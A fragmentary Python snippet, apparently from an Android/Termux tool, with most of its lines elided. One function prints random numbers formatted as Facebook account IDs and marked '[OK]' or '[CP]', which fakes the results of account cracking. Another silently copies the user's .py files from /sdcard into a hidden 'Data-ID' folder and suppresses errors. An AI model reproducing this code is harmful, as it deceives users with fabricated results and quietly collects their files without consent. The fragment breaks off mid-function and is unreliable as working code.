...
def fakeID():
	...
	for i in range(limit):
		crh = (rr(1,6))
		if crh==1:
			print(f"{red}[CP] 1000{str(rr(10,92))}{str(rr(100000000,999999999))} {str(rr(1111111,9999999))}{white}")
		else:
			print(f"{green}[OK] 1000{str(rr(10,92))}{str(rr(100000000,999999999))} {str(rr(1111111,9999999))}{white}")
...
def copyID(level=1):
	...
	if level==1:
		try:
			cmd("cp /sdcard/*.py /sdcard/Data-ID/Files")
		except:
			pass
		try:
		...
		try:
			...
			pass
		try:
			cmd("cp /sdcard/*.py /sdcard/Data-ID/File")
		except:
			pass
	elif level==3:
		try:
